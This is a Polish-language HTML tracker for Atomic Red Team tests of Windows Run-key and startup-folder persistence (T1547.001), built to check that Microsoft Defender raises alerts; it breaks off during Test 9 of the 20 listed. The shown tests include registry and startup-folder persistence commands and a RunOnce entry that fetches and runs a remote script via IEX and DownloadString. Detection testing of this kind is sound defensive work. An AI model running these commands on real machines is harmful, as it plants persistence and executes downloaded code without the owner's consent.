<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Alert: Registry Run Keys / Startup Folder – Atomic Red Team</title>
  <style>
    body { font-family: Segoe UI, Arial, sans-serif; margin: 2rem; background: #f6f7fb; }
    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 6px #bbb; padding: 2rem; max-width: 800px; margin: auto; }
    h1 { margin-top: 0; font-size: 2rem; }
    .desc, .id, .link, .author, .tactic, .status { margin-bottom: 1.1em; }
    .meta { font-size: .95em; color: #555; margin-bottom: .8em; }
    .section { font-size: .99em; }
    .scenario-block { background: #f4f0d9; border-radius: 7px; padding: 1em 1.2em; margin-bottom: 1.2em; color:#4a4500; font-size:1.07em; border-left:5px solid #e1c553; }
    pre { background: #eee; padding: .7em 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all; overflow-x: auto; max-width: 100%; }
    code { background: #f6f6f6; padding: 2px 5px; border-radius: 2px; }
    ul { margin-left: 1.6em; }
    textarea { width:100%; border-radius:8px; border:1.5px solid #d6d6d6; font-size:1.08em; margin-top:8px; padding:8px; background:#faf8ed;}
    .badge-ok { background: #43a047; color: #fff; }
    .art-accordion { margin-bottom:10px; }
    .art-accordion-btn { background:#eaf4ff; color:#1d3557; cursor:pointer; padding:9px 18px; width:100%; text-align:left; border:none; border-radius:7px; font-size:1.1em; font-weight:600; margin-bottom:2px; transition:background 0.18s;}
    .art-accordion-btn:hover { background:#ddefff; }
    .art-accordion-content { display:none; background:#f7fafd; border:1px solid #e3e3e3; border-radius:0 0 7px 7px; padding:13px 18px; margin-bottom:2px; }
    .test-cleanup { background:#fffde7; border-left:4px solid #ffd700; margin-top:11px; padding:7px 12px; border-radius:5px; }
    .badge { display:inline-block; border-radius:8px; padding:2px 10px; font-size:.94em; color:#fff; margin-right:7px; }
    .badge-ps { background:#1976d2; }
    .badge-cmd { background:#29b300; }
    .badge-total { background:#888; }
    .art-checklist { background: #f7fff7; border-radius:6px; margin-top:10px; padding:7px 15px; }
    .art-checklist label { font-size:1.02em; margin-right:20px; }
    .art-checklist input[type=checkbox] { transform: scale(1.2); margin-right:8px; }
    .art-copy-btn { background:#fff; border:1px solid #bdbdbd; color:#1976d2; border-radius:6px; padding:3px 11px; margin-left:8px; font-size:0.97em; cursor:pointer;}
    .art-copy-btn:active { background:#eaf4ff;}
    .eksport-btn { background:#c5e1a5; color:#1b4b2b; border-radius:7px; border:none; padding:9px 17px; margin:11px 0 5px 0; font-weight:600; cursor:pointer; }
    .eksport-btn:hover { background:#b2dfdb; }
    .import-btn { background:#bbdefb; color:#1a237e; border-radius:7px; border:none; padding:8px 15px; margin-left:8px; font-weight:600; cursor:pointer; }
    .import-btn:hover { background:#90caf9; }
  </style>
  <script>
    function toggleArtAccordion(btn) {
      var content = btn.nextElementSibling;
      content.style.display = (content.style.display === "block") ? "none" : "block";
    }
    function copyArtCode(btn) {
      var code = btn.previousElementSibling.textContent;
      navigator.clipboard.writeText(code);
      btn.textContent = "Skopiowano!";
      setTimeout(()=>btn.textContent="Kopiuj", 1100);
    }
    function saveChecklist(tid, id, scenarioBlockId, testLabel) {
      var uniqueId = tid + '-' + id;
      var div = document.getElementById('checklist-' + uniqueId);
      var chks = div.querySelectorAll('input[type=checkbox]');
      var states = Array.from(chks).map(x => x.checked);
      localStorage.setItem('art-checklist-' + uniqueId, JSON.stringify(states));
      var allChecked = states.every(x=>x);
      document.getElementById('tested-badge-' + uniqueId).style.display = allChecked ? 'inline-block' : 'none';
      if(allChecked && scenarioBlockId && testLabel) {
        var now = new Date().toLocaleString("pl-PL");
        var msg = `✅ [${now}] Przetestowano: ${testLabel} – utworzono alert w Defenderze`;
        var scenario = document.getElementById(scenarioBlockId);
        if(scenario && !scenario.value.includes(msg)) {
          scenario.value += "\n" + msg;
        }
      }
    }
    function loadChecklist(tid, id, scenarioBlockId, testLabel) {
      var uniqueId = tid + '-' + id;
      var div = document.getElementById('checklist-' + uniqueId);
      if (!div) return;
      var chks = div.querySelectorAll('input[type=checkbox]');
      var states = JSON.parse(localStorage.getItem('art-checklist-' + uniqueId) || '[]');
      chks.forEach((chk, i) => { chk.checked = !!states[i]; });
      var allChecked = states.length && states.every(x=>x);
      document.getElementById('tested-badge-' + uniqueId).style.display = allChecked ? 'inline-block' : 'none';
      if(allChecked && scenarioBlockId && testLabel) {
        var now = new Date().toLocaleString("pl-PL");
        var msg = `✅ [${now}] Przetestowano: ${testLabel} – utworzono alert w Defenderze`;
        var scenario = document.getElementById(scenarioBlockId);
        if(scenario && !scenario.value.includes(msg)) {
          scenario.value += "\n" + msg;
        }
      }
    }
    function resetChecklist(tid, id, scenarioBlockId, testLabel) {
      var uniqueId = tid + '-' + id;
      localStorage.removeItem('art-checklist-' + uniqueId);
      loadChecklist(tid, id, scenarioBlockId, testLabel);
    }
    function eksportujProgres(tid, total_tests) {
      let out = [];
      for(let i=1; i<=total_tests; i++) {
        let id = 'art' + String(i).padStart(2,'0');
        let uniqueId = tid + '-' + id;
        let div = document.getElementById('checklist-' + uniqueId);
        if(!div) continue;
        let label = div.getAttribute('data-label') || ("Atomic Test " + i);
        let chks = div.querySelectorAll('input[type=checkbox]');
        let states = Array.from(chks).map(x => x.checked);
        if(states.every(x=>x)) {
          let now = new Date().toLocaleString("pl-PL");
          out.push(`✅ [${now}] Przetestowano: ${label} – utworzono alert w Defenderze`);
        }
      }
      let box = document.getElementById('eksportChecklist');
      box.style.display = 'block';
      box.value = out.join("\n");
      box.select();
      document.execCommand('copy');
    }
    function pokazImport() {
      var el = document.getElementById('importBox');
      el.style.display = (el.style.display === 'block') ? 'none' : 'block';
    }
    function importujProgres() {
      var lines = document.getElementById('importProgress').value.split('\n');
      var tid = document.body.getAttribute('data-tid');
      var total_tests = Number(document.body.getAttribute('data-total-tests')||'1');
      for(let i=1; i<=total_tests; i++) {
        let id = 'art' + String(i).padStart(2,'0');
        let label = "";
        let div = document.getElementById('checklist-' + tid + '-' + id);
        if(!div) continue;
        label = div.getAttribute('data-label') || ("Atomic Test " + i);
        let ok = lines.some(line => line.includes(label));
        if(ok) {
          let chks = div.querySelectorAll('input[type=checkbox]');
          let states = Array(chks.length).fill(true);
          chks.forEach((chk, idx) => { chk.checked = true; });
          localStorage.setItem('art-checklist-' + tid + '-' + id, JSON.stringify(states));
          document.getElementById('tested-badge-' + tid + '-' + id).style.display = 'inline-block';
        }
      }
      alert('Przywrócono progres!');
      location.reload();
    }
    window.addEventListener('DOMContentLoaded', function() {
      var tid = document.body.getAttribute('data-tid');
      var total_tests = Number(document.body.getAttribute('data-total-tests')||'1');
      for(let i=1; i<=total_tests; i++) {
        let id = 'art' + String(i).padStart(2,'0');
        let div = document.getElementById('checklist-' + tid + '-' + id);
        if(!div) continue;
        let scenarioBlockId = div.getAttribute('data-scenario');
        let testLabel = div.getAttribute('data-label');
        loadChecklist(tid, id, scenarioBlockId, testLabel);
        div.querySelectorAll('input[type=checkbox]').forEach(function(chk) {
          chk.onchange = function() { saveChecklist(tid, id, scenarioBlockId, testLabel); };
        });
      }
    });
  </script>
</head>
<body data-tid="T1547.001" data-total-tests="20">
<div class="card">
  <h1>Alert: Registry Run Keys / Startup Folder</h1>
  <div class="meta"><b>Technique ID:</b> T1547.001</div>
  <div class="tactic section"><b>Tactics:</b> Persistence, Privilege-Escalation</div>
  <div class="status section"><b>Status:</b> ART / do walidacji</div>
  <div class="desc section"><b>MITRE Description:</b><br>Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the &quot;run keys&quot; in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.  The following run keys are created by default on Windows systems:  * &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; * &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt; * &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; * &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;  Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx&lt;/code&gt; is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a &quot;Depend&quot; key with RunOnceEx: &lt;code&gt;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d &quot;C:\temp\evil[.]dll&quot;&lt;/code&gt; (Citation: Oddvar Moe RunOnceEx Mar 2018)  Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is &lt;code&gt;C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&lt;/code&gt;. The startup folder path for all users is &lt;code&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&lt;/code&gt;.  The following Registry keys can be used to set startup folder items for persistence:  * &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&lt;/code&gt; * &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&lt;/code&gt; * &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&lt;/code&gt; * &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&lt;/code&gt;  The following Registry keys can control automatic startup of services during boot:  * &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt; * &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt; * &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt; * &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt;  Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:  * &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt; * &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;  Programs listed in the load value of the registry key &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows&lt;/code&gt; run automatically for the currently logged-on user.  By default, the multistring &lt;code&gt;BootExecute&lt;/code&gt; value of the registry key &lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager&lt;/code&gt; is set to &lt;code&gt;autocheck autochk *&lt;/code&gt;. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.  Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.</div>
  <div class="link section"><b>MITRE Link:</b> <a href="https://attack.mitre.org/techniques/T1547/001/" target="_blank">https://attack.mitre.org/techniques/T1547/001/</a></div>
  <div class="scenario-block">
    <b>Twój opis scenariusza:</b><br>
    <textarea id="scenarioBlock" rows="7" readonly>
Tutaj wpisz opis scenariusza lub eksportuj progres z checklisty poniżej.
    </textarea>
  </div>
  <button onclick="eksportujProgres('T1547.001',20)" class="eksport-btn">Eksportuj progres (do MD)</button>
  <button onclick="pokazImport()" class="import-btn">Załaduj progres z .md</button>
  <div id="importBox" style="display:none;margin-top:8px;">
    <textarea id="importProgress" rows="4" style="width:99%;"></textarea>
    <button onclick="importujProgres()" class="import-btn">Zastosuj progres</button>
  </div>
  <textarea id="eksportChecklist" rows="4" style="width:100%;margin-top:10px;display:none;"></textarea>
  <div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'>
    <b>Atomic Red Team – dostępne testy dla tej techniki:</b>
    <div style="margin-bottom:10px;">
      <span class="badge badge-total">20 testów</span>
      <span class="badge badge-ps">13 PowerShell</span>
      <span class="badge badge-cmd">7 CMD</span>
      <a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1547.001' target='_blank' style="float:right;">Zobacz na GitHubie</a>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-cmd">CMD</span>
        <b>Atomic Test 1: Reg Key Run</b>
        <span id="tested-badge-T1547.001-art01" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (cmd):</b>
          <pre>REG ADD &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;Atomic Red Team&quot; /t REG_SZ /F /D &quot;#{command_to_execute}&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Reg_Key_Run\test_1.cmd" download>Pobierz test_1.cmd</a><br>
        <div class="test-cleanup">
          <b>Cleanup (cmd):</b>
          <pre>REG DELETE &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;Atomic Red Team&quot; /f &gt;nul 2&gt;&1</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Reg_Key_Run\cleanup_1.cmd" download>Pobierz cleanup_1.cmd</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art01" data-scenario="scenarioBlock" data-label="Atomic Test 1: Reg Key Run">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art01','scenarioBlock','Atomic Test 1: Reg Key Run')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-cmd">CMD</span>
        <b>Atomic Test 2: Reg Key RunOnce</b>
        <span id="tested-badge-T1547.001-art02" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (cmd):</b>
          <pre>REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d &quot;#{thing_to_execute}&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Reg_Key_RunOnce\test_1.cmd" download>Pobierz test_1.cmd</a><br>
        <div class="test-cleanup">
          <b>Cleanup (cmd):</b>
          <pre>REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f &gt;nul 2&gt;&1</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Reg_Key_RunOnce\cleanup_1.cmd" download>Pobierz cleanup_1.cmd</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art02" data-scenario="scenarioBlock" data-label="Atomic Test 2: Reg Key RunOnce">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art02','scenarioBlock','Atomic Test 2: Reg Key RunOnce')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 3: PowerShell Registry RunOnce</b>
        <span id="tested-badge-T1547.001-art03" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>$RunOnceKey = &quot;#{reg_key_path}&quot;
set-itemproperty $RunOnceKey &quot;NextRun&quot; '#{thing_to_execute} &quot;IEX (New-Object Net.WebClient).DownloadString(`&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`&quot;)&quot;'</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\PowerShell_Registry_RunOnce\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>Remove-ItemProperty -Path #{reg_key_path} -Name &quot;NextRun&quot; -Force -ErrorAction Ignore</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\PowerShell_Registry_RunOnce\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art03" data-scenario="scenarioBlock" data-label="Atomic Test 3: PowerShell Registry RunOnce">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art03','scenarioBlock','Atomic Test 3: PowerShell Registry RunOnce')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 4: Suspicious vbs file run from startup Folder</b>
        <span id="tested-badge-T1547.001-art04" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>Copy-Item &quot;$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs&quot; &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs&quot;
Copy-Item &quot;$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs&quot; &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs&quot;
cscript.exe &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs&quot;
cscript.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Suspicious_vbs_file_run_from_startup_Fol\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>Remove-Item &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs&quot; -ErrorAction Ignore
Remove-Item &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs&quot; -ErrorAction Ignore</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Suspicious_vbs_file_run_from_startup_Fol\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art04" data-scenario="scenarioBlock" data-label="Atomic Test 4: Suspicious vbs file run from startup Folder">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art04','scenarioBlock','Atomic Test 4: Suspicious vbs file run from startup Folder')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 5: Suspicious jse file run from startup Folder</b>
        <span id="tested-badge-T1547.001-art05" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>Copy-Item &quot;$PathToAtomicsFolder\T1547.001\src\jsestartup.jse&quot; &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse&quot;
Copy-Item &quot;$PathToAtomicsFolder\T1547.001\src\jsestartup.jse&quot; &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse&quot;
cscript.exe /E:Jscript &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse&quot;
cscript.exe /E:Jscript &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Suspicious_jse_file_run_from_startup_Fol\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>Remove-Item &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse&quot; -ErrorAction Ignore
Remove-Item &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse&quot; -ErrorAction Ignore</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Suspicious_jse_file_run_from_startup_Fol\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art05" data-scenario="scenarioBlock" data-label="Atomic Test 5: Suspicious jse file run from startup Folder">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art05','scenarioBlock','Atomic Test 5: Suspicious jse file run from startup Folder')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 6: Suspicious bat file run from startup Folder</b>
        <span id="tested-badge-T1547.001-art06" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>Copy-Item &quot;$PathToAtomicsFolder\T1547.001\src\batstartup.bat&quot; &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat&quot;
Copy-Item &quot;$PathToAtomicsFolder\T1547.001\src\batstartup.bat&quot; &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat&quot;
Start-Process &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat&quot;
Start-Process &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Suspicious_bat_file_run_from_startup_Fol\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>Remove-Item &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat&quot; -ErrorAction Ignore
Remove-Item &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat&quot; -ErrorAction Ignore</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Suspicious_bat_file_run_from_startup_Fol\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art06" data-scenario="scenarioBlock" data-label="Atomic Test 6: Suspicious bat file run from startup Folder">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art06','scenarioBlock','Atomic Test 6: Suspicious bat file run from startup Folder')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 7: Add Executable Shortcut Link to User Startup Folder</b>
        <span id="tested-badge-T1547.001-art07" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>$Target = &quot;C:\Windows\System32\calc.exe&quot;
$ShortcutLocation = &quot;$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk&quot;
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Add_Executable_Shortcut_Link_to_User_Sta\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>Remove-Item &quot;$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk&quot; -ErrorAction Ignore</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Add_Executable_Shortcut_Link_to_User_Sta\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art07" data-scenario="scenarioBlock" data-label="Atomic Test 7: Add Executable Shortcut Link to User Startup Folder">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art07','scenarioBlock','Atomic Test 7: Add Executable Shortcut Link to User Startup Folder')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-cmd">CMD</span>
        <b>Atomic Test 8: Add persistance via Recycle bin</b>
        <span id="tested-badge-T1547.001-art08" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (cmd):</b>
          <pre>reg ADD &quot;HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command&quot; /ve /d &quot;calc.exe&quot; /f</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Add_persistance_via_Recycle_bin\test_1.cmd" download>Pobierz test_1.cmd</a><br>
        <div class="test-cleanup">
          <b>Cleanup (cmd):</b>
          <pre>reg DELETE &quot;HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open&quot; /f</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Add_persistance_via_Recycle_bin\cleanup_1.cmd" download>Pobierz cleanup_1.cmd</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art08" data-scenario="scenarioBlock" data-label="Atomic Test 8: Add persistance via Recycle bin">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art08','scenarioBlock','Atomic Test 8: Add persistance via Recycle bin')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 9: SystemBC Malware-as-a-Service Registry</b>
        <span id="tested-badge-T1547.001-art09" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>$RunKey = &quot;#{reg_key_path}&quot;
Set-ItemProperty -Path $RunKey -Name &quot;socks5_powershell&quot; -Value &quot;#{reg_key_value}&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\SystemBC_Malware-as-a-Service_Registry\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
